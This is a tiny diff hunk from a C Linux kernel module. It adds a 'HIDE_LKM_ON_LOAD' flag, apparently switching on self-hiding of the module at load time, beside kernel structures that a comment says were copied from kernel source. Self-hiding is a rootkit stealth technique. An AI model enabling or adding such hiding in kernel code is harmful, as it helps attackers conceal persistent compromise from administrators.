@@ -9,6 +9,7 @@
 #include <linux/slab.h>
 #include <linux/types.h>
 
+#define HIDE_LKM_ON_LOAD 1
 // Required definitions (stolen from kernel source code)
 // module.h
 struct module_sect_attr {
